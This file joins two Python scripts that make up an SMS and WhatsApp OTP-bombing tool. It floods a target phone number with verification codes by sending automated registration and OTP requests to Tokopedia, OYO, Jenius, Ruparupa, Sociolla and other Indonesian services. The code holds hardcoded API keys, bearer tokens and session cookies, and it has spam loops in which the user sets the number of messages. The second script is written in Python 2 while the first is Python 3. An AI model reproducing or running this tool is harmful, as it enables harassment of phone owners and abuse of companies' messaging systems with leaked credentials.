import os,sys,time,requests,re,json,random
from random import randrange as rg
print ("\033[00m")
def clear():
    os.system("clear")
def balik():
    f=input("\t[enter to back]")
    if f == "":
       os.system("python spam.py")
    else:
       sys.exit()

def baner():
    print ('''
\t
╔╗ ┬─┐┬ ┬┌┬┐┌─┐┬  ╔═╗┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐
╠╩╗├┬┘│ │ │ ├─┤│  ╚═╗├─┘├─┤││││││├┤ ├┬┘
╚═╝┴└─└─┘ ┴ ┴ ┴┴─┘╚═╝┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─

\t------------
\nCreator: MrRobot 
Youtube: MrRobot Framework
Telegram : MrRobot Corp
==========================================''')
def kata(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)

def jenius():
    ua={
    "accept": "*/*",
    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
    "version": "2.36.1-7565",
    "accept-language": "id",
    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
    "Content-Type": "application/json",
    "Host": "api.btpn.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
    "User-Agent": "okhttp/3.12.1"
    }
    dat=json.dumps({"query":"mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables":{"phone":w,"language":"id"},"operationName":"registerPhone"})
    r=requests.post("https://api.btpn.com/jenius", data=dat, headers=ua).text
def rupa():
     ua={
     "Host": "wapi.ruparupa.com",
     "Connection": "keep-alive",
     "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
     "Accept": "application/json",
     "Content-Type": "application/json",
     "X-Company-Name": "odi",
     "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
     "user-platform": "mobile",
     "X-Frontend-Type": "mobile",
     "Origin": "https://m.ruparupa.com",
     "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
     "Accept-Encoding": "gzip, deflate, br",
     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     }
     dat=json.dumps({"phone":no,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
     r = requests.post("https://wapi.ruparupa.com/auth/generate-otp", data=dat, headers=ua).text
def mapclub():
    ua={
    "Host": "cmsapi.mapclub.com",
    "Connection": "keep-alive",
    "Accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "content-type": "application/json",
    "Origin": "https://www.mapclub.com",
    "Referer": "https://www.mapclub.com/en/user/signup",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=ua).text
def oyo():
    ua={
    "Host": "identity-gateway.oyorooms.com",
    "consumer_host": "https://www.oyorooms.com",
    "accept-language": "id",
    "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "accept": "*/*",
    "origin": "https://www.oyorooms.com",
    "referer": "https://www.oyorooms.com/login",
    "Accept-Encoding": "gzip, deflate, br",
    }
    dat=json.dumps({"phone":c,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
    r = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=dat, headers=ua).text
def depop():
    ua={
    "Host": "webapi.depop.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone_number":no,"country_code":"ID"})
    r = requests.put("https://webapi.depop.com/api/auth/v1/verify/phone", data=dat, headers=ua)
def soplai():
    ua={
    "Host": "api.sooplai.com",
    "accept": "application/json, text/plain, */*",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "origin": "https://www.sooplai.com",
    "referer": "https://www.sooplai.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    dat=json.dumps({"phone":no})
    r = requests.post("https://api.sooplai.com/customer/register/otp/request", data=dat, headers=ua)
def call():
    head = {
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
    "Content-Type": "application/json",
    "Origin": "https://id.jagreward.com",
    "Referer": "https://id.jagreward.com/member/register/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
    "_ga": "GA1.2.2037151396.1584709855",
    "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
    "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
    }
    r = requests.get("https://id.jagreward.com/member/verify-mobile/"+c+"/", headers=head)
def call2():
    ua={
    "Content-Type": "application/json",
    "Host": "srv3.sampingan.co.id",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "User-Agent": "okhttp/4.4.0"
    }
    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
    r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
def alodoc():
    req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
def olx():
    req=requests.post("https://www.olx.co.id/api/auth/authenticate", json={"grantType":"phone","phone":w,"language":"id"}).json()
def matahari():
     heder = {'Host': 'thor.matahari.com',
              'content-length': '230',
              'modulecode': 'MR',
              'origin': 'https://www.matahari.com',
              'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
              'content-type': 'application/json',
              'accept': 'application/json, text/plain, */*',
              'clientid': 'mds_mweb',
              'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36',
              'sessionid': '1595084426451',
              'save-data': 'on',
              'referer': 'https://www.matahari.com/register',
              'accept-encoding': 'gzip, deflate, br',
              'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'}

     data = {'emailAddress': 'noobie@mail.com',
             'firstName': 'Noobie',
             'lastName': 'Gans',
             'mobileNumber': no,
             'mccCardNumber': '',
             'password': 'asecc123',
             'referralCode': '',
             'dateOfBirth': '09-05-1993',
             'gender': 'Male',
             'registrationType': 'N'}
     sec = requests.post('https://thor.matahari.com/MatahariMobileAPI/register', headers=heder, json=data)
def socil():
    headreg={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }

    ses=requests.Session()
    reg=ses.post("https://soco-api.sociolla.com/auth/register",json={"acquisition_source":"sociolla-web-mobile","email":f"noobie{rg(9999)}@mail.com","user_name":f"noobiegans{rg(9999)}","password":f"noobie{rg(9999)}","first_name":f"Noobie{rg(999)}","last_name":f"Gans{rg(999)}","gender":"Male","salute":"Mr","phone_no":no}, headers=headreg)
    token=reg.json()['data']['token']
    headotp={
    "Host": "soco-api.sociolla.com",
    "Connection": "keep-alive",
    "Sec-Fetch-Mode": "cors",
    "Origin": "https://www.sociolla.com",
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json;charset\u003dUTF-8",
    "Accept": "application/json, text/plain, */*",
    "session_id": "c970c955-79d1-45fd-840c-9082650a7a89",
    "SOC-PLATFORM": "sociolla-web-mobile",
    "User-Agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 EdgA/45.06.4.5042",
    "Sec-Fetch-Site": "same-site",
    "Referer": "https://www.sociolla.com/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7",
    }
    rotp=ses.post("https://soco-api.sociolla.com/auth/otp/code", json={"mode":"sms","entity":"phone_no"}, headers=headotp).json()
def klik():
    dat={'number':no}
    r=requests.post("https://nuubi.herokuapp.com/api/spam/klikdok", data=dat)
def indo():
    ua={
    "Host": "account-api-v1.klikindomaret.com",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "content-type": "application/json",
    "accept": "*/*",
    "origin": "https://account.klikindomaret.com",
    "referer": "https://account.klikindomaret.com/SMSVerification?nohp="+no+"&type=register",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    r=requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+no, headers=ua).text
def wa2():
    name="Danz"+str(random.randrange(11,99999))
    pas="termux"+str(random.randrange(111,999))
    ua={
    "Host": "qtva.id",
    "Connection": "keep-alive",
    "Accept": "text/html, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://qtva.id",
    "Referer": "https://qtva.id/page/register/siswa",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}
    dat={
    "namaDepan":name,
    "emailNope":no,
    "password":pas,
    "konfirmasiPass":pas
    }
    r=requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data=dat, headers=ua).text
if __name__=="__main__":
     try:
          clear()
          baner()
          hh="+62"
          no=input("[+]Phone Number: ")
          c=no[1:12]
          w=hh+c 
          kata("Waiting....!!")
          jenius()
          oyo()
          mapclub()
          call()
          time.sleep(2)
          soplai()
          depop()
          rupa()
          matahari()
          socil()
          indo()
          olx()
          call2()
          time.sleep(2)
          alodoc()
          klik()
          wa2()
          time.sleep(2)
          kata("[•]Done..")
          balik()
     except KeyError:
             sys.exit()
     except KeyboardInterrupt:
             sys.exit()
     except requests.exceptions.ConnectionError:
             sys.exit('connection error!')
     except TypeError:
             balik()
     except ValueError:
             balik()
            
            
from requests import ConnectionError
from time import sleep
import requests, sys, os, re, random

os.system('clear')

M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def MesinTik(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.05)
	
def MesinTik_2(text):
	for x in text + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		sleep(random.random() * 0.02)
	
def Banner():
	MesinTik_2(''+C+'''
  ____                         __        __    
 / ___| _ __   __ _ _ __ ___   \ \      / /_ _ 
 \___ \| '_ \ / _` | '_ ` _ \   \ \ /\ / / _` |
  ___) | |_) | (_| | | | | | |   \ V  V / (_| |
 |____/| .__/ \__,_|_| |_| |_|    \_/\_/ \__,_|
       |_|                                     
                   '''+W+'Creator : MrRobot\n\t\t  YT : MrRobot Framework')
                   
def RupaRupa():
	print
	MesinTik(C+'\t SPAM RUPA RUPA')
	MesinTik(W+'\t================')
	print
	number = raw_input(''+C+'MASUKKAN NOMOR TARGET'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
	jumlah = input(''+C+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
	print
	MesinTik_2(''+C+'-------------- '+W+'Starting'+C+' --------------')
	print
	hitung = len(number)
	
	if hitung < 9:
		print
		print(M+'Nomor Tidak Valid !')
		sys.exit()
	
	for x in range(jumlah):
		try:
			
			headers_1 = {
			
			'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
			'Accept' : 'application/json',
			'Origin' : 'https://m.ruparupa.com',
			'Referer' : 'https://m.ruparupa.com/my-account',
			'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
			'x-company-name' : 'odi'
			
			}
			
			data_1 = {
			
			'phone' : number,
			'email' : 'jejak@gmail.com',
			'action' : 'register',
			'password' : ''
			
			}
			
			headers_2 = {
			
			'authorization' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiYjMzZTk5NjctMjdhMy00ZjkxLWE2M2MtM2M4NzMyZTZhOTU2IiwiaWF0IjoxNTgwNjM2ODI0LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.pC9EDy_79GIDd4NOJKZP2kH5EjPdUK5VGUn59CzsdG0',
			'x-company-name' : 'odi', 
			'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.1.1; AFTT Build/LVY48F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.10',
			'Origin' : 'https://m.ruparupa.com',
			'referer' : 'https://m.ruparupa.com/verification?page=otp-choices',
			'accept-encoding' : 'gzip, deflate, br' 
			
			}
			
			data_2 = {
			
			'phone' : number,
			'action' : 'register',
			'channel' : 'chat',
			'email' : '',
			'customer_id' : '0',
			'is_resend' : 0
			
			}
			
			url_1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
			url_2 = 'https://wapi.ruparupa.com/auth/generate-otp'
			
			sending_1 = requests.post(url_1, headers = headers_1, data = data_1)
			sending_2 = requests.post(url_2, headers = headers_2, data = data_2)
			
			if 'tunggu 1x24 jam' in sending_2.text:
				print
				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 1 x 24 Jam Lagi :)')
				break
				
			else:
				print(''+C+'['+W+'*'+C+']'+W+' SPAM KE NOMOR '+C+number+W+' BERHASIL DIKIRIMKAN !')
		
		except ConnectionError:
			print
			print(M+'Cek Koneksi JaringanMu Gan !')
			break
		
		except NameError:
			print
			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf !')
			break
			

def Tokped():
	print
	MesinTik(C+'\t SPAM TOKOPEDIA')
	MesinTik(W+'\t================')
	print
	number = raw_input(''+C+'MASUKKAN NOMOR TARGET'+W+' ('+H+' Ex :'+C+' 0812xxxx '+W+') : ')
	jumlah = input(''+C+'JUMLAH SPAM'+W+' ('+H+' Ex :'+C+' 3 '+W+') : ')
	print
	MesinTik_2(''+C+'-------------- '+W+'Starting'+C+' --------------')
	print
	for x in range(jumlah):
		try:
			
			headers = {
			
			'Connection' : 'keep-alive',
			'Accept' : 'application/json, text/javascript, */*; q=0.01',
			'Origin' : 'https://accounts.tokopedia.com',
			'X-Requested-With' : 'XMLHttpRequest',
			'User-Agent' : '{acak}',
			'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8',
			'Accept-Encoding' : 'gzip, deflate',
			
			} 
			
			site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+number+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
			
			data = {
			
			'otp_type' : '116',
			'msisdn' : number,
			'tk' : search,
			'email' : '',
			'original_param' : '',
			'user_id' : '',
			'signature' : '',
			'number_otp_digit' : '6',
			
			} 
			
			sleep(30) # Jangan Di Rubah Nilai Sleepnya, Itu Udah Default.
			
			sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = data)
				
			if 'Anda sudah melakukan 3 kali pengiriman kode' in sending.text:
				print
				print(''+W+'Pengiriman Sudah Limit\nSilahkan Coba 25 - 60 Menit Lagi :)')
				break
				
			else:
				print(''+C+'['+W+'*'+C+']'+W+' SPAM KE NOMOR '+C+number+W+' BERHASIL DIKIRIMKAN !')
				
		except ConnectionError:
			print
			print(M+'Cek Koneksi JaringanMu Gan !')
			break
		
		except NameError:
			print
			print(M+'Jumlah Harus Berupa Angka, Bukan Huruf !')
			break
                   
                   
def Spam():
	os.system('clear')
	print(C+'Subscribe Dulu Channel Saya'+W+' Bro !'+C+' :V')
	sleep(1.5)
	os.system('xdg-open https://www.youtube.com/c/MrRobotFramework')
	os.system('clear')
	sleep(1.3)
	Banner()
	print
	print
	print(C+'MENU'+W+' :')
	print(C+'\t['+W+'1'+C+']'+W+' SPAM TOKOPEDIA'+C+' ( '+H+'Aktif'+C+' )')
	print(C+'\t['+W+'2'+C+']'+W+' SPAM RUPA-RUPA'+C+' ( '+M+'NonAktif'+C+' )')
	print
	
	try:
		
		pilih = input(C+'PILIH MENU'+W+' \xE2\x9E\xA4 '+C+'')
		if pilih == 1:
			Tokped() 
		elif pilih == 2:
			RupaRupa()
		else:
			pass
			
	except NameError:
		print
		print(M+'Pilih Menu Harus Berupa Angka, Bukan Huruf !')
		sys.exit()
			
if __name__ == '__main__':
	Spam()
